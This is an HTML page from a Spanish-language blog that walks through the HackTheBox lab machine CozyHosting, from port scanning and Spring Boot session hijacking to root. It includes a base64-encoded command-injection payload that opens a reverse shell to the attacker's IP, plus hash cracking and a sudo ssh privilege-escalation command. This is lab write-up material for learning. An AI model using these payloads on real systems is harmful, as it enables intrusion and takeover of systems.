@@ -1,0 +1,368 @@
+<!DOCTYPE html>
+<html lang="es"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Maquina CozyHosting HTB Write-Up | Pirrandi</title>
+<meta name="generator" content="Jekyll v3.9.3" />
+<meta property="og:title" content="Maquina CozyHosting HTB Write-Up" />
+<meta name="author" content="Pirrandi" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Empezaremos con el Write-Up de la maquina de HackTheBox llamada CozyHosting." />
+<meta property="og:description" content="Empezaremos con el Write-Up de la maquina de HackTheBox llamada CozyHosting." />
+<link rel="canonical" href="http://localhost:4000/2023/10/31/CozyHosting.html" />
+<meta property="og:url" content="http://localhost:4000/2023/10/31/CozyHosting.html" />
+<meta property="og:site_name" content="Pirrandi" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2023-10-31T00:00:00-03:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Maquina CozyHosting HTB Write-Up" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Pirrandi"},"dateModified":"2023-10-31T00:00:00-03:00","datePublished":"2023-10-31T00:00:00-03:00","description":"Empezaremos con el Write-Up de la maquina de HackTheBox llamada CozyHosting.","headline":"Maquina CozyHosting HTB Write-Up","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2023/10/31/CozyHosting.html"},"url":"http://localhost:4000/2023/10/31/CozyHosting.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Pirrandi" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">Pirrandi <b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-green-hover" href="https://github.com/pirrandi"><i class="fab fa-github-square"></i></a><a class="color-green-hover" href="https://twitter.com/tucuentadetwitter"><i class="fab fa-twitter-square"></i></a><a class="color-green-hover" href="https://www.linkedin.com/in/tuperfillinkedin"><i class="fab fa-linkedin"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="https://www.hackthebox.com/storage/avatars/6bcb2b4c2931783b04d57610d49c7694.png" class="author-avatar" alt="Avatar" />
+    
+Blog personal sobre Conceptos de Hacking Etico.
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Maquina CozyHosting | HTB Write-Up</h1>
+  
+  <div class="post-tags">
+     
+      <a class="tag" href="/tag/HTB,/">HTB,</a>
+      
+      <a class="tag" href="/tag/Facil,/">Facil,</a>
+      
+      <a class="tag" href="/tag/Linux/">Linux</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 31 Oct 2023</div>
+  
+  <noscript>
+    <div class="post-description">Empezaremos con el Write-Up de la maquina de HackTheBox llamada CozyHosting.</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <h1 id="timelapse--hack-the-box">Timelapse ~ Hack The Box</h1>
+
+<p>Machine IP: 10.10.11.152</p>
+
+<h2 id="reconocimiento">Reconocimiento</h2>
+
+<p>Empezamos con el escaneo de puertos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.11.230 <span class="nt">-oG</span> allPorts
+</code></pre></div></div>
+
+<p>Nos encontramos con el puerto <strong>22</strong> y <strong>80</strong> abiertos.</p>
+
+<p>Ahora realizamos el escaneo de versiones:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 10.10.11.230 <span class="nt">-oN</span> targeted
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp open  http    nginx 1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: Cozy Hosting - Home
+|_http-server-header: nginx/1.18.0 <span class="o">(</span>Ubuntu<span class="o">)</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</code></pre></div></div>
+
+<p>Agregamos la pagina al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.230 cozyhosting.htb 
+</code></pre></div></div>
+
+<p>Mientras revisamos el servicio web realizaremos una enumeracion de directorios con Wfuzz:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span><span class="o">=</span>404 <span class="nt">-t</span> 20 <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://cozyhosting.htb/FUZZ
+</code></pre></div></div>
+
+<p>Encontramos algunos directorios:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>000000015:   200        284 L    745 W      12706 Ch    <span class="s2">"index"</span>
+000000053:   200        96 L     196 W      4431 Ch     <span class="s2">"login"</span>
+000000259:   401        0 L      1 W        97 Ch       <span class="s2">"admin"</span>     
+000001225:   204        0 L      0 W        0 Ch        <span class="s2">"logout"</span>                 
+000002708:   500        0 L      1 W        73 Ch       <span class="s2">"error"</span>
+</code></pre></div></div>
+
+<p>En el login nos encontramos con este formulario:</p>
+
+<p><img src="https://i.imgur.com/lFA5bvu.png" alt="" />
+Pruebo algunas inyecciones, y editar algunas cosas con el inspector pero no logro nada.</p>
+
+<p>Paso a ver la pagina de error, y me encuentro con algo que me llama la atencion:</p>
+
+<p><img src="https://i.imgur.com/WfYskGP.png" alt="" /></p>
+
+<p>Decido googlear “Whitelabel Error Page”, y me encuentro que corresponde a un error de SpringBoot.</p>
+
+<p>Intento algunas inyecciones pero no llego a nada.
+Investigando encuentro que SpringBoot tiene sus propios directorios, asi que decide enumerar directorios que correspondan a SpringBoot y encuentro lo siguiente:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>000000051:   200        0 L      1 W        15 Ch       <span class="s2">"actuator/health"</span>
+000000044:   200        0 L      13 W       487 Ch      <span class="s2">"actuator/env/path"</span>
+000000038:   200        0 L      120 W      4957 Ch     <span class="s2">"actuator/env"</span>
+000000041:   200        0 L      13 W       487 Ch      <span class="s2">"actuator/env/lang"</span>
+000000072:   200        0 L      1 W        445 Ch      <span class="s2">"actuator/sessions"</span>
+000000029:   200        0 L      1 W        634 Ch      <span class="s2">"actuator"</span>
+000000039:   200        0 L      13 W       487 Ch      <span class="s2">"actuator/env/home"</span>
+000000058:   200        0 L      108 W      9938 Ch     <span class="s2">"actuator/mappings"</span>
+000000032:   200        0 L      542 W      127224 Ch   <span class="s2">"actuator/beans"</span>
+</code></pre></div></div>
+
+<p>Revisando el directorio <code class="language-plaintext highlighter-rouge">actuator/sessions</code> encuentro esto:</p>
+
+<p><img src="https://i.imgur.com/VeNDZQs.png" alt="" /></p>
+
+<p>Lo que parece ser un usuario con su Token.</p>
+
+<p>Anteriormente habiamos encontrado un directorio de <strong>admin</strong>, asi que intentaremos ingresar una vez hayamos puesto el token:</p>
+
+<p><img src="https://i.imgur.com/b3X0G26.png" alt="" /></p>
+
+<p>Ahora recargamos a la pagina de <strong>admin</strong></p>
+
+<p><img src="https://i.imgur.com/qJDXNfE.png" alt="" /></p>
+
+<p><strong>Obtuvimos acceso al panel de admin!</strong></p>
+
+<p>Revisando la pagina, el apartado que mas llama la atencion es al final de todo</p>
+
+<p><img src="https://i.imgur.com/9OLcGhY.png" alt="" /></p>
+
+<p>Al parecer nos permite configurar una conexion por SSH.</p>
+
+<p>Si ingresamos solamente el Hostname, y dejamos el Username vacio nos dara un error, el cual nos dara un indicio de un Command Injection.</p>
+
+<p><img src="https://i.imgur.com/ixn0ixE.png" alt="" /></p>
+
+<p>Creamos un PAYLOAD que nos permita entablar una [[Reverse Shell]]:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">;</span><span class="nb">echo</span><span class="k">${</span><span class="nv">IFS</span><span class="k">}</span><span class="s2">"c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNjkvNDQzIDA+JjE="</span>|base64<span class="k">${</span><span class="nv">IFS</span><span class="k">}</span><span class="nt">-d</span>|bash<span class="p">;</span>
+</code></pre></div></div>
+
+<blockquote>
+  <p>El comando a ejecutar debe estar en Base64.</p>
+</blockquote>
+
+<p><img src="https://i.imgur.com/DEA6RYW.png" alt="" /></p>
+
+<p>Dentro del usuario <strong>app</strong> no podemos hacer mucho, asi que tendremos que buscar la manera de escalar privilegio.</p>
+
+<p>El archivo mas interesante que encontramos, es en la misma carpeta de <strong>app</strong> llamado <code class="language-plaintext highlighter-rouge">cloudhosting-0.0.1.jar</code></p>
+
+<p>Lo pasamos a nuestra maquina, y extraemos lo que contiene.
+Buscando entre las carpetas extraidas encontramos un archivo <code class="language-plaintext highlighter-rouge">application.properties</code> en
+<code class="language-plaintext highlighter-rouge">/content/BOOT-INF/classes/</code> el cual contiene informacion para conectarse a una base de datos <strong>postresql</strong></p>
+
+<p><img src="https://i.imgur.com/F82RIuT.png" alt="" /></p>
+
+<p>Una vez conectado a la base de datos con el comando:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>psql <span class="s2">"postgresql://</span><span class="nv">$DB_USER</span><span class="s2">:</span><span class="nv">$DB_PWD</span><span class="s2">@</span><span class="nv">$DB_SERVER</span><span class="s2">/</span><span class="nv">$DB_NAME</span><span class="s2">"</span>
+</code></pre></div></div>
+
+<p>Comenzamos a enumerar.
+<img src="https://i.imgur.com/wZUqABH.png" alt="" />
+En la base de datos <strong>cozyhosting</strong> encontramos el hash del usuario <strong>Admin</strong>.</p>
+
+<p><img src="https://i.imgur.com/YoqyzNK.png" alt="" /></p>
+
+<p>Utilizando [[Hashcat]] desciframos la password:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 3200 <span class="nt">-a</span> 0 hash.txt /home/pirra/Downloads/rockyou.txt <span class="nt">-o</span> cracked.txt
+</code></pre></div></div>
+
+<p>Con la password obtenida tendremos acceso al usuario <strong>Josh</strong></p>
+
+<p><img src="https://i.imgur.com/i1sxXnQ.png" alt="" /></p>
+
+<p>Haciendo un <strong>sudo -l</strong> y proporcionando la password obtenida me doy cuenta de que puedo utilizar SSH como sudo:</p>
+
+<p><img src="https://i.imgur.com/jWBt3Y2.png" alt="" /></p>
+
+<p>Aca ya sabemos lo que debemos hacer.
+Directamente vamos <a href="https://gtfobins.github.io/gtfobins/ssh/">GTFObins</a> y buscamos SSH, y de inmediato encontramos un comando que nos permite acceder a usuario <strong>Root</strong></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo ssh -o ProxyCommand=';sh 0&lt;&amp;2 1&gt;&amp;2' x
+</code></pre></div></div>
+<p><img src="https://i.imgur.com/P4wcmol.png" alt="" /></p>
+
+<p>Con esto la maquina queda finalizada.</p>
+
+<p>Happy Hacking!!</p>
+
+
+</div>
+
+
+<div class="comments">
+<div id="disqus_thread"></div>
+<script>
+ var disqus_config = function () {
+     this.page.url = 'http://localhost:4000/2023/10/31/CozyHosting.html';
+     this.page.identifier = '/2023/10/31/CozyHosting';
+     this.page.title = 'Maquina CozyHosting | HTB Write-Up';
+ };
+
+ (function() {  // REQUIRED CONFIGURATION VARIABLE: EDIT THE SHORTNAME BELOW
+     var d = document, s = d.createElement('script');
+
+     s.src = '//bitbrain-github-io.disqus.com/embed.js';
+
+     s.setAttribute('data-timestamp', +new Date());
+     (d.head || d.body).appendChild(s);
+ })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>
+
+</div>
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/2023/10/31/Love.html">
+            Maquina Love | HTB Write-Up
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/2023/09/29/Timelapse.html">
+            Maquina Timelapse | HTB Write-Up
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'Empezaremos con el Write-Up de la maquina de HackTheBox llamada CozyHosting.';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
